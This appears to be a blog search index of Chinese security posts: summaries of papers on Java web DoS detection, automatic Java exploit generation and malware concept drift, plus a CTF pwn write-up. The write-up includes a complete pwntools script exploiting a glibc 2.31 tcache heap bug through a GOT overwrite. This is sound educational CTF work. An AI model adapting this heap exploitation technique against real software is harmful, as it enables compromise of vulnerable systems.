@@ -1,0 +1,190 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>2025N1CTF</title>
+      <link href="/2025/11/07/2025NepCTF%20copy/"/>
+      <url>/2025/11/07/2025NepCTF%20copy/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> all </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Careless Retention and Management-Understanding and Detecting Data Retention Denial-of-Service Vulnerabilities in Java Web Containers</title>
+      <link href="/2025/09/09/DRDos/"/>
+      <url>/2025/09/09/DRDos/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Careless-Retention-and-Management-Understanding-and-Detecting-Data-Retention-Denial-of-Service-Vulnerabilities-in-Java-Web-Containers"><a href="#Careless-Retention-and-Management-Understanding-and-Detecting-Data-Retention-Denial-of-Service-Vulnerabilities-in-Java-Web-Containers" class="headerlink" title="Careless Retention and Management: Understanding and Detecting Data Retention Denial-of-Service Vulnerabilities in Java Web Containers"></a>Careless Retention and Management: Understanding and Detecting Data Retention Denial-of-Service Vulnerabilities in Java Web Containers</h1><h2 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h2><ul><li>论文作者：（复旦白泽）<font style="color:rgb(68, 68, 68);">Lian Keke; Zhang Lei; Zhao Haoran; Cao Yinzhi; Liu Yongheng; Sun Fute; Zhang Yuan; Yang Min</font></li><li>发表时间：2025</li><li>发表期刊&#x2F;会议：USENIX</li><li>阅读时间：2025.09.01</li></ul><h2 id="论文内容简述"><a href="#论文内容简述" class="headerlink" title="论文内容简述"></a>论文内容简述</h2><p>文章关注DRDOS——数据保留DOS，即用户的输入被保留在长期存活不会被垃圾回收机制回收的对象中，通过多次触发，在内存中生成大量垃圾对象，最终实现对目标服务耗尽内存的攻击。</p><h2 id="论文创新核心"><a href="#论文创新核心" class="headerlink" title="论文创新核心"></a>论文创新核心</h2><ul><li>提出并系统地分析了java web容器中存在的DRDOS问题，描述了这种攻击的可能性。</li><li>开发了DR.D静态分析模型，实现对具有DRDOS漏洞的web容器的检测。</li><li>发现了28个0day漏洞并全部被开发者承认。</li></ul><h2 id="论文重点部分记录"><a href="#论文重点部分记录" class="headerlink" title="论文重点部分记录"></a>论文重点部分记录</h2><p>为检测DRDOS漏洞，文中提出了DR.D模型，其结构图如下：</p><p><img src="/../static/DRDos/1.png"></p><p>该模型将原任务分为三部分：</p><ol><li>从原始代码中定位出web请求处理程序。</li><li>发现java代码中可能长期存在的类或变量。</li><li>检测和验证漏洞存在。</li></ol><h3 id="1、如何定位web容器的请求处理程序？"><a href="#1、如何定位web容器的请求处理程序？" class="headerlink" title="1、如何定位web容器的请求处理程序？"></a>1、如何定位web容器的请求处理程序？</h3><p>通过自动识别容器特定的请求类并对请求数据操作方式进行聚类来定位请求处理程序。为了解决这个问题，提出了一种请求数据驱动的方法，首先通过识别代表请求数据的容器特定类，然后通过分析请求数据操纵方法之间的关系来定位请求处理程序。</p><p><img src="/../static/DRDos/2.png"></p><p>作者认为不论java的web容器种类如何，都是需要满足servlet标准的，即实现相关接口或继承相关类，如上表所示。作者认为满足这些条件的类可以被认为是和web请求处理强相关的，而进一步继承这些类的子类都可以被判断为实际发挥作用的web请求处理接口。在识别出所有请求类后，DR . D通过提取带有请求类类型参数的方法来检测请求数据操纵方法。除了利用已识别的请求类，DR . D还考虑了包含请求类类型字段的包装类。</p><p><img src="/../static/DRDos/3.png"></p><p>进一步的一个关键见解是，尽管在命名和功能上存在差异，但请求处理程序在灵活可配置的设计模式中表现出共同的特征。为了实现灵活的配置和统一的调用，每个集群中的方法通常遵循相同的规范，例如实现或覆盖相同的方法。此外，这些集群的组织和管理遵循共同的设计模式，如上图所示的例子。在集中管理中，请求处理程序存储在一个基于开发者配置的队列中，管理器依次调用每个处理程序( (例如, doFilter () )。在分散式管理中，下一个处理程序通过其字段显式地配置在当前处理程序中，从而调用后续处理程序。</p><p>基于这些特点，DR . D通过对请求数据操作方式进行聚类来定位请求处理程序。DR . D首先对共享同一个子签名(相同的函数名称、参数和返回值)的方法进行分组。然后，对于每个组，DR . D分析其调用关系。如果这些方法缺乏直接的调用，但共享同一个调用者，这也是他们的共同被调用者，它们被确定为使用集中管理。如果这些方法之间存在直接的相互调用，则被判断为分散式管理。</p><h3 id="2、如何确定长寿命对象？"><a href="#2、如何确定长寿命对象？" class="headerlink" title="2、如何确定长寿命对象？"></a>2、如何确定长寿命对象？</h3><p>通过机器学习模型对长寿命Java类进行分类。这里的关键见解是，在像Java这样的面向对象语言中，每个类都被设计成一个专门的职责，经常决定其实例在运行期间是否具有较长的生命周期。因此，DR . D可以通过分析一个类的特征来推断其实例是否具有较长的生命周期。</p><p>由于没有可用的长寿命类别数据库，作者手动构建了用于特征分析和模型训练的数据集。一方面，我们通过分析容器的启动脚本来识别容器的启动入口点，然后手动分析容器的启动过程。另一方面，使用JProfiler运行一个基本配置的Web容器，动态分析内存中的类实例信息。对于每个类，由三位具有Java Web开发专业知识的分析人员独立评估其为长寿命或短寿命。当至少有两个分析师有相同的判断时，才认为其是长寿命类。</p><ul><li>长寿命类通常具有较少的实例，并且实例化操作在频繁触发的请求处理程序中不太可能发生。</li><li>长寿命类对象在函数调用中往往表现出较低的移动性。</li><li>长寿命类通常由容器管理并用于管理容器资源，因此它们较少被其他类引用，而对其他类有更多的引用。</li><li>可配置类更可能是长寿命的。</li><li>不全局访问的类不太可能是长寿命的，例如匿名的内部类。</li><li>可迭代类通常代表可以频繁变化的数据集合，不太可能是长寿命的。</li><li>长寿命类更可能被多个线程并发使用，导致类中具有更多并发访问保护的字段和函数</li><li>长寿命类倾向于考虑隔离和并发的静态方法比例更低。</li></ul><p><img src="/../static/DRDos/4.png"></p><p>作者挖掘了13个对判断长寿命类有帮助的特征。</p><h3 id="3、如何完成对漏洞的检测和验证？"><a href="#3、如何完成对漏洞的检测和验证？" class="headerlink" title="3、如何完成对漏洞的检测和验证？"></a>3、如何完成对漏洞的检测和验证？</h3><p>通过数据流分析来分析任何请求数据是否从请求处理程序传播到长寿命对象，从而检测出脆弱的数据保持。此外，DR . D通过静态检查对请求数据值空间、数据保留能力和保留数据的寿命的限制来评估每个漏洞候选的可利用性。</p><p>作者提出了一种轻量级但有效的方法，以最少的人工干预来静态评估漏洞可利用性。DR . D通过建模和分析利用脆弱数据保持的必要条件，通过静态分析对漏洞的可利用性进行分类和评估。该方法可以有效地筛选出不可利用的候选漏洞，帮助开发人员优先验证哪些漏洞。</p><p>从确定的入口点开始，DR . D将请求数据作为污点源，进行精确的上下文、字段和流敏感的数据流分析。具体来说，DR . D考虑了两种场景。一方面，请求数据被保留在长寿命的服务器数据中，导致累积内存消耗。在这种情况下，DR . D检查污点数据是否被添加到长寿命类所引用的大小可扩展对象中。为了识别尺寸可扩展的对象，首先从JDK文档中编译了一个Java原生可迭代类的列表，其中包括它们的add&#x2F;remove指令和size属性。然后，DR . D通过类层次结构分析，自动识别扩展或实现这些原生类或接口的容器特定类。</p><p><img src="/../static/DRDos/5.png"></p><p>脆弱性可利用性评估。只有当攻击者控制的请求数据被保留在服务器数据中而不受大小限制且不被释放时，数据保留才是可利用的。因此，DR . D从三个角度分析了利用限制：请求数据值空间、数据保持能力和服务器数据寿命。这里的关键见解是，数据保留通常是请求处理的一个重要部分，因此我们可以专注于静态地分析影响内存消耗的关键条件，而不需要处理运行时路径和配置约束。上图说明了DR . D是如何分析针对特定数据保持的利用限制的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>核心思想感觉还是比较容易理解的，实现过程中也用了很多符合直觉的方法。还是角度找的好，问题定位到java web容器中去，这种DOS也很符合直觉的是可以绕过现有DOS的waf的攻击方式。</p><h2 id="论文pdf附件"><a href="#论文pdf附件" class="headerlink" title="论文pdf附件"></a>论文pdf附件</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/27284222/1756694571920-157fa847-cdee-402e-817a-a47684e81e2b.pdf">Careless Retention and Management-Understanding and Detecting Data Retention Denial-of-Service Vulnerabilities in Java Web Containers.pdf</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 科研 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> attack detect </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Towards Automatic Detection and Exploitation of Java Web Application Vulnerabilities via Concolic Execution guided by Cross-thread Object Manipulation</title>
+      <link href="/2025/09/09/JAEX/"/>
+      <url>/2025/09/09/JAEX/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Towards-Automatic-Detection-and-Exploitation-of-Java-Web-Application-Vulnerabilities-via-Concolic-Execution-guided-by-Cross-thread-Object-Manipulation"><a href="#Towards-Automatic-Detection-and-Exploitation-of-Java-Web-Application-Vulnerabilities-via-Concolic-Execution-guided-by-Cross-thread-Object-Manipulation" class="headerlink" title="Towards Automatic Detection and Exploitation of Java Web Application Vulnerabilities via Concolic Execution guided by Cross-thread Object Manipulation"></a>Towards Automatic Detection and Exploitation of Java Web Application Vulnerabilities via Concolic Execution guided by Cross-thread Object Manipulation</h1><h2 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h2><ul><li>论文作者：（复旦白泽）Xinyou Huang1*, Lei Zhang2*, Yongheng Liu1, Peng Deng1, Yinzhi Cao3, Yuan Zhang2, and Min Yang2</li><li>发表时间：2025</li><li>发表期刊&#x2F;会议：USENIX</li><li>阅读时间：2025.09.09，第二次细读记录</li></ul><h2 id="论文内容简述"><a href="#论文内容简述" class="headerlink" title="论文内容简述"></a>论文内容简述</h2><p>论文核心是提出了一个JAEX模型，用于实现java漏洞的自动化检测，特别是涉及跨线程数据流的漏洞，并能够自动化生成利用流程。</p><h2 id="论文创新核心"><a href="#论文创新核心" class="headerlink" title="论文创新核心"></a>论文创新核心</h2><p>论文关注的方法部分解决了目前没啥人做过的java跨数据流安全问题，并实现了漏洞的自动化检测与利用。作者叙述了领域内其他编程语言中的跨线程数据流漏洞检测的工作，说明了其在 java 漏洞检测上的不适用性。实验部分JAEX 可以自动化检测和生成攻击载荷，效果显著。</p><h2 id="论文重点部分记录"><a href="#论文重点部分记录" class="headerlink" title="论文重点部分记录"></a>论文重点部分记录</h2><p><img src="/../static/JAEX/1.png"></p><p>上图为 JAEX 整体结构，主要分为两个大的阶段，stage1 为静态分析，stage2 为concolic 执行部分。每个大阶段分为两个小阶段。</p><h3 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage-1"></a>Stage-1</h3><p>在这一阶段，JAEX检测到潜在的漏洞，并提取执行concolic执行所需的信息。</p><h4 id="Phase-1-基于指针的-ICFG-构造"><a href="#Phase-1-基于指针的-ICFG-构造" class="headerlink" title="Phase-1 基于指针的 ICFG 构造"></a>Phase-1 基于指针的 ICFG 构造</h4><p>JAEX对表示漏洞的源和汇API进行建模和识别。这里的一个障碍是，Java Web应用通常包含大量的抽象类型对象(例如,使用依赖注入来声明Java对象)，JAEX很难获得应用的完整控制流图( CFG )，导致源&#x2F;接收器识别的假阴性较高。因此，作者提出了一种基于指针的ICFG，通过使用指向分析来加强控制流图的构建。</p><p>考虑到java 语言的复杂性，其原始 CFG 可能过于复杂和并不能真实表示出细致的代码信息，因此作者基于Anderson的指针分析算法实现了基于指针的 CFG-ICFG。</p><p>图中包括两种 entry：</p><pre><code>1. 常规的Web入口点，包括从主流Web应用框架中提取的处理HTTP请求映射对象的方法，如Servlet的doGet方法。2. 线程入口点，包括Java内置的线程机制(例如, Thread.run)以及第三方框架和库提供的异步通信API。</code></pre><p><img src="/../static/JAEX/2.png"></p><p>如上表所示，JAEX通过分析五种主要的Web框架，包括Spring、Struts2、Servlet、JAX RS和JAX WS，利用17种模式来识别这些表项。给定一个Java Web应用程序，JAEX会遍历它的所有类，并通过匹配这些模式来提取相应的Web条目。值得注意的是，为了识别线程入口点，JAEX还对控制流图( Control Flow Graph，ICFG )进行控制流分析，以确定线程入口方法是否被调用或是否作为背景线程(例如无限循环中的方法)运行。</p><p>目标识别。对于代码目标点，为了使JAEX尽可能通用，作者收集了超过500个危险方法( (例如,命令执行方法、Runtime.exec () )以及几个框架级别的危险方法模式( (例如, Mybatis等ORM框架中用户自定义的SQL API) )。JAEX将这些方法在整个应用程序中的调用站点标识为汇，用于后续分析。</p><h4 id="Phase-2-漏洞检测和攻击流顺序识别"><a href="#Phase-2-漏洞检测和攻击流顺序识别" class="headerlink" title="Phase-2 漏洞检测和攻击流顺序识别"></a>Phase-2 漏洞检测和攻击流顺序识别</h4><p>在阶段2中，JAEX识别共享对象并构建跨线程数据流图( DFG )来连接跨不同线程的源和目标。具体来说，JAEX使用一个目标引导的、按需的迭代算法来搜索DFG，并检测sink的参数是否可以被用户输入所污染。一旦识别出脆弱的数据流，JAEX进一步从CFG中提取执行路径。然后，通过识别共享对象(例如,在读API之前必须执行一个写API)的API操作序列，推断Web入口调用序列。最后，为了指导concolic执行，JAEX将进一步提取所需的代码上下文，并通过识别不同线程之间的条目、sink和共享对象来初始化必要的信息。</p><p>JAEX首先构造了一个跨线程的数据流程图( DFG )，代表潜在的跨线程数据流信息，以方便漏洞检测。然后，它使用目标代码点引导的、按需的和迭代的算法来搜索漏洞，并推断触发漏洞所需的请求序列。</p><p>一个观察是，跨线程的数据流是由线程之间的共享对象连接的。基于此，作者的关键见解是，这些共享对象通常在程序运行的整个生命周期中都是持久化的，那些具有跨线程数据交互的对象总是通过特定的API进行读写操作的访问。因此，通过将这些持久化对象识别为潜在的共享对象，以及这些对象是否跨不同线程读写，可以揭示潜在的线程间数据流关系。具体来说，JAEX识别了四种跨线程数据流机制，并将它们作为模式来识别共享对象和相关的访问操作，并连接跨线程数据流：</p><ol><li>全局变量访问</li><li>数据库操作相关</li><li>文件操作相关</li><li>异步通信</li></ol><p>攻击顺序流识别过程为目标代码点（污点）驱动，JAEX 首先根据污点集合初始化一批短的攻击流，然后迭代的扩增攻击路径，具体地，只有当当前路径中无受外部代码影响和操纵的变量时，认为完整的攻击路径已经发现，否则将满足上述条件的变量认为是污点变量，进一步扩增攻击路径，这个过程中，JAEX 记录攻击流顺序和用于触发的参数信息。</p><h3 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage-2"></a>Stage-2</h3><p>在这个阶段，JAEX对静态分析检测到的可能存在的漏洞进行验证，并为其生成利用脚本。</p><h4 id="Phase-3-通过混合执行验证漏洞有效性"><a href="#Phase-3-通过混合执行验证漏洞有效性" class="headerlink" title="Phase-3 通过混合执行验证漏洞有效性"></a>Phase-3 通过混合执行验证漏洞有效性</h4><p>JAEX首先设置了对每个潜在漏洞进行concolic测试所需要的最小运行环境。之后，JAEX会根据静态分析提取的信息生成初始输入，并将其传递给相应的入口方法，用于驱动concolic执行在执行过程中，JAEX通过插桩收集执行路径上的约束，并进行求解，以帮助执行引擎生成下一个输入。此外，如果在此过程中发现任何条件语句不受当前输入的影响，则动静结合引擎将这些信息反馈到静态分析阶段，以改进路径搜索。</p><p><strong>混合执行的变量定义。</strong>为了在执行(例如,某个变量从哪里来,它遇到了哪些操作)时准确跟踪用户输入，JAEX将动静结合变量定义为四元组：(类型、值、源、描述)。类型表示变量的数据类型。值是变量在运行时的具体值。源表示变量的来源，如方法和来自(正式定义见附录B)的参数。符号表达式包含了变量在运行时执行过程中遇到的路径约束。对于复杂的对象，JAEX 嵌套地定义其类型，最终落到 java 基本对象上。</p><p><strong>混合执行的操作。</strong>在混合执行过程中，不同的变量相互作用，JAEX 中定义了如下操作：</p><ul><li>正则运算符，加减乘除等。</li><li>常用操作API：参考JDK中的StringBuilder.append等方法和流行的第三方库的API，如Hutool中的StringUtil.concat等。</li><li>外部资源相关的API：这些API操纵外部资源，如数据库或文件。JAEX对实际中遇到的API进行建模，并为每类外部资源维护一个全局状态。JAEX然后根据运行时状态、API调用上下文和语义返回正确的动静结合变量。例如，在数据库操作中，JAEX模拟了一个由Java对象组成的数据库(例如, MySQL)，反映了CRUD操作时的状态变化。JAEX通过调用相关API中的关键语句来捕获预期的SQL表达式和预期的返回值，这允许其理解API的完整语义。通过结合传递的参数和语义，从模拟数据库中返回特定的动静结合变量。</li><li>未建模操作：对于未建模的操作，例如开发人员引入的第三方库中的方法，JAEX直接执行这些方法，将返回值封装并转化为动静结合变量。</li></ul><p><strong>混合执行的按步执行策略。</strong>JAEX采用分步执行的策略进行协同执行。它遵循我们静态分析推断出的web entry调用序列，构造必要的方法参数，并调用相应的方法。每个web表项的执行由指导符号引导，这些指导符号是在静态分析过程中确定的控制变量，必须受到当前web表项的影响，以满足由另一个web表项触发的执行路径中的某些路径约束。</p><p><strong>约束和对象依赖分析。</strong>在执行过程中，JAEX可能会发现一些条件语句应该包含动静结合变量。在这些情况下，JAEX使用约束求解器来确定它们所需的值。</p><h4 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase-4"></a>Phase-4</h4><p>JAEX针对已验证的漏洞生成漏洞利用。具体来说，它使用一个跨线程操作图( Object Manipulation Graph，COMG )来描述输入、共享对象和函数参数之间的关系，以及在执行路径上应该满足的约束。然后，基于专家派生的利用模板和获取的COMG构建利用所需的HTTP请求序列。</p><p><strong>漏洞库。</strong>作者收集了150多个真实世界的漏洞利用，并针对7类漏洞编写了37个漏洞利用模板，这些模板已在匿名的git仓库中提供，以备审查。该数据库针对同一漏洞类型的不同利用方式维护一个利用模板，允许通过替换预定义的部分来产生不同的利用结果。</p><p><strong>COMG 构造。</strong>COMG是基于从concolic执行阶段检索到的约束和依赖信息构建的。JAEX将这些信息与针对特定Web框架的HTTP请求和Java对象漏洞利用之间的预先建模的映射结合起来，最终得到这种表示生成具体漏洞利用所需核心元素的数据结构。COMG提供了以下五种类型的信息：</p><ol><li>Http描述。将HTTP请求映射到Web入口参数或运行时对象。</li><li>调用顺序。指定HTTP请求发送的先后顺序。</li><li>字段依赖性。定义了跨不同请求的特定字段之间的依赖关系。</li><li>有效载荷的约束。概述了请求字段必须满足的约束条件。</li><li>代码目标点位置。识别可注入攻击载荷的位置。</li></ol><p>利用COMG，JAEX将从concolic执行中获得的漏洞利用对象转换为具体的HTTP请求。最终自动化完成漏洞利用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="论文pdf附件"><a href="#论文pdf附件" class="headerlink" title="论文pdf附件"></a>论文pdf附件</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/27284222/1757385387387-13bb1e8a-cccd-4fbf-bb42-d0150302b081.pdf">Towards Automatic Detection and Exploitation of Java Web Application Vulnerabilities via Concolic Execution guided by Cross-thread Object Manipulation.pdf</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 科研 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> attack detect </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2022_TQLCTF_Unbelievable_write</title>
+      <link href="/2025/08/02/2022-TQLCTF-Unbelievable-write/"/>
+      <url>/2025/08/02/2022-TQLCTF-Unbelievable-write/</url>
+      
+        <content type="html"><![CDATA[<p>看一下保护</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/1.png" alt="img"></p><p>程序got表可写，无pie，libc版本为2.31，有tcache</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/2.png" alt="img"></p><p>看下main，一个菜单题，c1 c2 c3 三个选项。</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/3.png" alt="img"></p><p>初始化函数设置了ptr为一个0x10大小的堆块，为全局变量</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/4.png" alt="img"></p><p>c1函数为一个可控大小的malloc，向其读入内容之后立刻free掉，此处为与大多数题目不一样的地方，因为malloc之后立刻free，所以在tcache attack的时候需要绕过free的重重检查。</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/5.png" alt="img"></p><p>c2函数为一个可控地址的free，借助ptr，堆地址完全可控，该free可以访问到任意堆地址</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/6.png" alt="img"></p><p>c3为后门函数，检查全局变量target是否被修改，若被修改了则得到flag。</p><p>分析到这里，本challenge正如题目所描述，我们的目的是达成一次unbelievable write，即向target中写入数据。</p><p>这里给出一个非预期解，打tcache控制块tcache perthread struct，该控制块位于堆地址首部，与ptr存在固定偏移，因此我们可以利用一次free将其释放，然后通过修改tcache控制块内容实现tcache attack，达到任意地址堆块分配。则只需分配到target处修改内容即可。</p><p>为绕过free函数限制，覆写free的got表为puts函数。</p><p>关于tcache 控制快的补充说明：</p><p>tcache控制块在堆初始化的时候分配，content区大小为0x280</p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/7.png" alt="tcache控制块1"></p><p><img src="/../static/2022_TQLCTF_Unbelievable_write/8.png" alt="tcache控制块2"></p><p>其前0x80大小的内容为tcache数量，以2字节为单位，分别用于表示堆块大小从0x10~0x400共64种不同大小的tcache数量。</p><p>下面的0x200大小，以8字节为单位，共64个单位，分别记录从0x10~0x400大小的tcache的链表首个堆块的地址。</p><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>binary = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>target = <span class="hljs-number">0x404080</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">position</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(position).encode())<br><br><br>free(-<span class="hljs-number">0x290</span>)<span class="hljs-comment">#free the tcache perthread struct</span><br><br>add(<span class="hljs-number">0x280</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;\x01&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x6f</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(binary.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br><br>add(<span class="hljs-number">0x90</span>,p64(binary.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<span class="hljs-comment">#overwrite free got--&gt;puts plt</span><br><br>add(<span class="hljs-number">0x280</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;\x01&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x6f</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(target))<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<span class="hljs-comment">#overwrite target to get flag</span><br><br>backdoor()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>By 【Del0n1x】</p><p>Keyboard</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2025NepCTF</title>
+      <link href="/2025/08/01/2025NepCTF/"/>
+      <url>/2025/08/01/2025NepCTF/</url>
+      
+        <content type="html"><![CDATA[<p>马上准备复现，难度中等偏下的感觉？</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> all </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CADE-Detecting and Explaining Concept Drift Samples for Security Applications</title>
+      <link href="/2024/07/09/CADE/"/>
+      <url>/2024/07/09/CADE/</url>
+      
+        <content type="html"><![CDATA[<p>发表会议：USENIXSec 2021</p><p><strong>代码地址</strong>：<a href="https://github.com/whyisyoung/CADE">https://github.com/whyisyoung/CADE</a></p><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>为了对抗概念漂移的问题，设计一个模型CADE来实现对漂移样本的检测以及分类。<br><img src="/../static/CADE/CADE-1.png" alt="[Pasted image 20240709100037.png]"></p><p>检测偏离现有类的漂移样本<br>提供解释来解释检测到的漂移。<br>漂移检测模块：负责监测输入原分类模型中的数据是否存在问题，即检测漂移数据<br>解释漂移模块：训练了一个基于距离的语义解释函数来对发现的漂移数据进行解释，并未是否需要对模型进行再训练提供一个参考。</p><p>由于概念漂移，部署基于机器学习的安全应用可能非常具有挑战性。无论是恶意软件分类、入侵检测，还是在线滥用检测，基于学习的模型都是在”封闭世界”假设下工作的，希望测试数据的分布与训练数据的分布大致匹配。然而，模型部署的环境通常是随时间动态变化的。这种变化既可能包括良性玩家的有机行为变化，也可能包括攻击者的恶意突变和适应。因此，测试数据分布正在从原始训练数据中转移，这可能会导致模型出现严重的故障。为了解决概念漂移问题，大多数基于学习的模型需要定期重新训练。然而，再训练往往需要标注大量的新样本(代价昂贵)。更重要的是，也很难确定何时应该重新训练模型。延迟再训练会使过时的模型容易受到新的攻击。我们设想，对抗概念漂移需要建立一个监控系统来检查输入数据流和训练数据(和&#x2F;或当前分类器)之间的关系。高层思路如图1所示。当原始分类器在生产空间中工作时，另一个系统应该周期性地检查分类器的合格程度，以便对输入的数据样本进行决策。检测模块(∂)可以过滤正在远离训练空间的漂移样本。更重要的是，为了推理(例如,攻击者突变、有机行为改变、先前未知的系统漏洞等)漂移的原因，我们需要一种解释方法(∑)将检测决策与语义有意义的特征联系起来。这两个模块对于开放世界的恶意软件检测是非常重要的。<br>之前的工作已经探索了通过直接检查原始分类器的预测置信度来检测漂移样本。置信度得分较低，说明进入的样本为漂移样本。然而，这个置信度评分是在假设所有类别已知(封闭世界)的基础上计算得到的概率(总和达到1.0)。一个不属于任何已有类的漂移样本可能被分配到一个高置信度的错误类(得到了已有工作的验证)中。最近的一项工作提出了计算传入样本与每个现有类之间的非一致性度量来确定适应度的想法。这种不一致性度量是基于一个距离函数来计算的，以量化这种不一致性。</p><h2 id="本文方法"><a href="#本文方法" class="headerlink" title="本文方法"></a>本文方法</h2><p>在本文中，我们提出了一种新的方法来检测漂移样本，并结合一种新的方法来解释检测决策。总的来说，我们构建了一个名为CADE的系统，简称为”用于漂移检测和解释的对比自编码器”。关键的挑战是推导出一个有效的距离函数来度量样本的相异性。我们利用对比学习的思想，根据已有的标签，从已有的训练数据中学习距离函数，而不是任意挑选距离函数。给定原始分类器的训练数据(多个类别)，我们将训练样本映射到一个低维隐空间。通过对比样本学习映射函数，扩大不同c的样本之间的距离<br>为了解释一个漂移的样本，我们识别了一组小的重要特征，这些特征将这个样本与它最近的类区分开来。一个关键的观察是，传统的(监督的)解释方法并不能很好地解释。其启示在于，有监督的解释方法要求两类(漂移样本和已有类)都有足够的样本来估计其分布。然而，由于漂移样本位于训练分布之外的稀疏空间，这一要求很难满足。相反，我们发现基于距离变化，即导致漂移样本与其最近类之间距离变化最大的特征来推导解释更有效。</p><p>在多类分类设置中，主要存在两类概念漂移。A型：引入新类：漂移样本来自训练数据集中不存在的新类。因此，原先训练好的分类器无法对漂移样本进行分类；B型：类内进化：漂移样本仍来自已有的类，但其行为模式与训练数据集中存在明显差异。在这种情况下，原始分类器很容易在这些漂移样本上出错。在本文中，我们主要关注Type A概念漂移，即在多类环境中引入一个新类。以恶意软件分类为例，我们的目标是检测和解释来自先前看不到的恶意软件家族的漂移样本。从本质上讲，漂移样本是训练数据中所有现有类的分布外样本。</p><p>我们认为预测概率在我们的问题情境中不太可能有效。原因是这个概率反映了对现有类(例如,样本在A类中的拟合情况要好于B类)的相对适应度。如果样本来自一个全新的类(既不是A类或者B 